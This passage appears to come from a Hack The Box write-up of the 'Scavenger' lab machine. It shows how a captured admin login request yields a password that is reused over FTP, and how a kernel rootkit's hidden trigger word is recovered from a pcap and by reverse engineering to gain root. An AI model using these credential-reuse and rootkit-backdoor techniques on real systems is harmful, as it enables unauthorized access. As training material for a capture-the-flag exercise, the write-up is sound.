ajax=1&amp;amp;token=&amp;amp;controller=AdminLogin&amp;amp;submitLogin=1&amp;amp;passwd=GetYouAH4t%21&amp;amp;email=pwnhats%40pwnhats.htb&amp;amp;redirect=http%3a//www.pwnhats.htb/admin530o6uisg/%26token%3de44d0ae2213d01986912abc63712a05b

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;From here I got passwd &lt;code class=&quot;highlighter-rouge&quot;&gt;GetYouAH4t%21&lt;/code&gt; where &lt;code class=&quot;highlighter-rouge&quot;&gt;%21=!&lt;/code&gt; so &lt;code class=&quot;highlighter-rouge&quot;&gt;GetYouAH4t!&lt;/code&gt;. So basically we had to give a try any commands for any file. I  tried this passin every user which I got from ftp&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp&amp;gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwx------    5 1001     1004         4096 Feb 28 06:23 ib01c01
drwx------    3 1002     1004         4096 Dec 11  2018 ib01c02
drwx------    4 1003     1004         4096 Jan 30  2019 ib01c03
dr-xrwx---    3 1005     1000         4096 Dec 10  2018 ib01ftp
drwx------    3 1004     1000         4096 Dec 10  2018 ib01www
drwx------    2 1000     1000         4096 Feb 02  2019 support
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Finally I m into &lt;code class=&quot;highlighter-rouge&quot;&gt;ib01c01&lt;/code&gt; user on &lt;code class=&quot;highlighter-rouge&quot;&gt;ls&lt;/code&gt; I got user.txt and downloaded to my local machine using &lt;code class=&quot;highlighter-rouge&quot;&gt;get&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp&amp;gt; get user.txt 
local: user.txt remote: user.txt
No control connection for command: Success
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ cat user.txt
6f8a8a************
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This way I got the user.txt file without getting shell for user.&lt;/p&gt;

&lt;h1 id=&quot;unprivelege--privilege-escalation&quot;&gt;Unprivelege-&amp;gt; Privilege Escalation&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;ftp-&amp;gt;ib01c01-&amp;gt;.pcap&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ ftp www.supersechosting.htb
Connected to www.supersechosting.htb.
220 (vsFTPd 3.0.3)
Name (www.supersechosting.htb:bikram): ib01c01
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-------    1 1001     1004           32 Jan 30  2019 access.txt
-rw-r--r--    1 1001     1004     68175351 Dec 07  2018 prestashop_1.7.4.4.zip
-rw-r-----    1 0        1004           33 Dec 07  2018 user.txt
drwxr-xr-x   26 1001     1004         4096 Dec 10  2018 www
226 Directory send OK.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;While doing enumeration it would be better if you analyze/use the files which was found before. So I analyzed .pcap file with wireshark and got file root.c .&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Wireshark: File-&amp;gt;Export Objects-&amp;gt;HTTP&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/incident_pcapfile.png&quot; alt=&quot;incident_pcapfile&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then, I downloaded it in my local machine. You can get file here &lt;a href=&quot;/public/files/root.c&quot;&gt;root.c&lt;/a&gt;. After analyzing this file I noticed that it is Kernel Rootkit. There is a saying&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;and found really good source for it you can visit here: &lt;a href=&quot;https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485&quot;&gt;detail&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;LKM-&amp;gt; ‘magic’-&amp;gt; Root&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;After reading above blog I noticed that I should had &lt;code class=&quot;highlighter-rouge&quot;&gt;root.ko&lt;/code&gt; file and a word &lt;code class=&quot;highlighter-rouge&quot;&gt;magic&lt;/code&gt;. At first, I searched for word magic in root.c file and got &lt;code class=&quot;highlighter-rouge&quot;&gt;g0tR0ot&lt;/code&gt;. I tried with that word in browser from previous user &lt;code class=&quot;highlighter-rouge&quot;&gt;ib01c03&lt;/code&gt;with payload as
&lt;img src=&quot;/public/images/lkm_rootkit.png&quot; alt=&quot;lkm_rootkit&quot; /&gt;
and got same user so word &lt;code class=&quot;highlighter-rouge&quot;&gt;magic&lt;/code&gt; was changed. For that I searched that word in every part of home dir of &lt;code class=&quot;highlighter-rouge&quot;&gt;ib01c01&lt;/code&gt; and found &lt;code class=&quot;highlighter-rouge&quot;&gt;old school way of hidding a files &lt;/code&gt; on &lt;code class=&quot;highlighter-rouge&quot;&gt;ls -al&lt;/code&gt; I got this.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp&amp;gt; ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwx------    5 1001     1004         4096 Feb 28 06:23 .
drwxr-xr-x    8 0        0            4096 Dec 07  2018 ..
drwxr-xr-x    2 1001     1004         4096 Feb 02  2019 ...
-rw-------    1 0        0               0 Dec 11  2018 .bash_history
drwx------    2 1001     1004         4096 Feb 28 06:23 .ssh
-rw-------    1 1001     1004           32 Jan 30  2019 access.txt
-rw-r--r--    1 1001     1004     68175351 Dec 07  2018 prestashop_1.7.4.4.zip
-rw-r-----    1 0        1004           33 Dec 07  2018 user.txt
drwxr-xr-x   26 1001     1004         4096 Dec 10  2018 www
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;There I noticed &lt;code class=&quot;highlighter-rouge&quot;&gt;...&lt;/code&gt; directory where I found &lt;code class=&quot;highlighter-rouge&quot;&gt;root.ko&lt;/code&gt; file
and downloaded it to my local machine using command as previous. Since &lt;code class=&quot;highlighter-rouge&quot;&gt;root.ko&lt;/code&gt; file was ELF file so I tried simple &lt;code class=&quot;highlighter-rouge&quot;&gt;head&lt;/code&gt; command as&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n174:~$ head -n1 root.ko
ELF&amp;gt;@@&amp;amp;%GNUœ-ME&amp;lt;_|1HATUHzSI@HH eH%(HD$1Hg0tR0otD$g3tD$
                                                      Pr1vHD$D$Hu,HHHL$eH3
                                                                       %(H []A\H1HHLHLD$
                                                                                           HL$H|$Ht$HuiHItiHADAD$LAD$AD$AD$AD$
D$ AD$HH1H11IHyHHHHHH=Hv-=H1HtHH=11I1H=Hv7H==H1H5H=H=H==H1HttyRK: 
Cannot prepare credentials 

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From here I got two word &lt;code class=&quot;highlighter-rouge&quot;&gt;g0tR0ot&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;g3tPr1v&lt;/code&gt; since first word was &lt;code class=&quot;highlighter-rouge&quot;&gt;magic&lt;/code&gt; word from root.c but second one wasn’t from there so I tried that word and luckly got the root.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/root_magic.png&quot; alt=&quot;root_magic&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now I can read root.txt file as&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/root_txt.jpg&quot; alt=&quot;root_txt&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;alternative-method-to-root&quot;&gt;Alternative Method to Root&lt;/h2&gt;
&lt;h3 id=&quot;reverse-engineering&quot;&gt;Reverse Engineering&lt;/h3&gt;
&lt;p&gt;Though I got the root from simple way and I tried other way to get root. As &lt;code class=&quot;highlighter-rouge&quot;&gt;root.ko&lt;/code&gt; file was ELF file and I love reversing the ELF file so I analyzed using my latest favorite tool &lt;code class=&quot;highlighter-rouge&quot;&gt;ghidra&lt;/code&gt;. I opened it using &lt;code class=&quot;highlighter-rouge&quot;&gt;ghidra&lt;/code&gt; if you are unfamiliar with &lt;code class=&quot;highlighter-rouge&quot;&gt;ghidra &lt;/code&gt; tool you can see more about it here: &lt;a href=&quot;https://www.ghidra-sre.org/&quot;&gt;ghidra&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;From the analysis of file root.c word &lt;code class=&quot;highlighter-rouge&quot;&gt;magic&lt;/code&gt; was in function &lt;code class=&quot;highlighter-rouge&quot;&gt;root_write()&lt;/code&gt;. So I checked that function in &lt;code class=&quot;highlighter-rouge&quot;&gt;ghidra&lt;/code&gt; and got below as result.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/root_write.png&quot; alt=&quot;root_write&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There I saw three variables as &lt;code class=&quot;highlighter-rouge&quot;&gt;local_31&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;local_2d&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;local_28&lt;/code&gt; which was defined already. But these variable was defined in &lt;code class=&quot;highlighter-rouge&quot;&gt;little Indian&lt;/code&gt; format. If you are unfamiliar with this format then don’t worry I will explain in my next blog.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  local_31 = 0x743367; # g3t
  local_2d = 0x76317250; # Pr1v
  local_28 = 0x746f3052743067; # g0tR0ot
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;And on analyzing more about that function I got something fishy in &lt;code class=&quot;highlighter-rouge&quot;&gt;snprintf((char *)&amp;amp;local_28,8,&quot;%s%s&quot;,&amp;amp;local_31,&amp;amp;local_2d);&lt;/code&gt;. In the above function from &lt;code class=&quot;highlighter-rouge&quot;&gt;ghidra&lt;/code&gt; I found that value of &lt;code class=&quot;highlighter-rouge&quot;&gt;local_28&lt;/code&gt; is replaced with &lt;code class=&quot;highlighter-rouge&quot;&gt;local_31+local_2d&lt;/code&gt;. If you are unfamiliar about &lt;code class=&quot;highlighter-rouge&quot;&gt;snprintf&lt;/code&gt; function you can visit here &lt;a href=&quot;http://joequery.me/code/snprintf-c/&quot;&gt;snprintf&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;So my final &lt;code class=&quot;highlighter-rouge&quot;&gt;magic&lt;/code&gt; word was &lt;code class=&quot;highlighter-rouge&quot;&gt;g3tPr1v&lt;/code&gt;. Using this as above in browser, I  got the root.txt file.&lt;/p&gt;

&lt;p&gt;This way I got the root of scavenger box and learned alot from this box. So I would like to thank creator of this box &lt;code class=&quot;highlighter-rouge&quot;&gt;ompamo&lt;/code&gt; for such an awesome box. Especially enumeration, enumeration and enumeration was awesome.&lt;/p&gt;

&lt;p&gt;I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup.&lt;br /&gt;
Feedback are really appreciated !!&lt;br /&gt;
Tweet about this writeup if you like.&lt;/p&gt;

&lt;p&gt;You can see more blog at my medium here: &lt;a href=&quot;https://medium.com/@gr4n173&quot;&gt;gr4n173&lt;/a&gt;.&lt;/p&gt;</content><author><name>gr4n173&gt;</name></author><category term="linux" /><category term="htb" /><category term="ftp" /><category term="sqli" /><category term="RE" /><category term="lkm" /><category term="fuzz" /><category term="whois" /><category term="pcap" /><category term="ffuf" /><summary type="html">HTB:Scavenger</summary></entry></feed>